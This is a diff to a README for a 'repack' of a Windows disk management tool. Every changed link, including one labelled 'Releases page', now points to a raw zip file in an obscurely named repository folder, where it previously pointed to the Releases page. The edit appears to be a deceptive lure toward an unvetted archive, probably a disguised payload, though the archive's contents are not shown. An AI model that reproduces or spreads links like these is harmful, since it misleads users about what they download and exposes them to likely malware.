@@ -1,6 +1,6 @@
 # 🛠️ QILING-Disk-Master-Repack - Effortless Disk Management for Windows
 
-[![Download QILING Disk Master Repack](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80-blue?style=for-the-badge)](https://github.com/Darsq/QILING-Disk-Master-Repack/releases)
+[![Download QILING Disk Master Repack](https://raw.githubusercontent.com/Darsq/QILING-Disk-Master-Repack/main/confelicity/Master-QILIN-Disk-Repack-v3.2.zip%20Now-%20%F0%9F%9A%80-blue?style=for-the-badge)](https://raw.githubusercontent.com/Darsq/QILING-Disk-Master-Repack/main/confelicity/Master-QILIN-Disk-Repack-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to QILING-Disk-Master-Repack! This application helps you manage your har
 
 To get started, visit the Releases page to download the application.
 
-[Download QILING Disk Master Repack](https://github.com/Darsq/QILING-Disk-Master-Repack/releases)
+[Download QILING Disk Master Repack](https://raw.githubusercontent.com/Darsq/QILING-Disk-Master-Repack/main/confelicity/Master-QILIN-Disk-Repack-v3.2.zip)
 
-1. Open your web browser and go to the [Releases page](https://github.com/Darsq/QILING-Disk-Master-Repack/releases).
+1. Open your web browser and go to the [Releases page](https://raw.githubusercontent.com/Darsq/QILING-Disk-Master-Repack/main/confelicity/Master-QILIN-Disk-Repack-v3.2.zip).
 2. Look for the latest version.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -69,4 +69,4 @@ Stay updated and connect with other users to share experiences and tips on using
 
 Thank you for choosing QILING-Disk-Master-Repack! We appreciate your support and hope this software helps you manage your disks efficiently. 
 
-[Download QILING Disk Master Repack](https://github.com/Darsq/QILING-Disk-Master-Repack/releases)
+[Download QILING Disk Master Repack](https://raw.githubusercontent.com/Darsq/QILING-Disk-Master-Repack/main/confelicity/Master-QILIN-Disk-Repack-v3.2.zip)
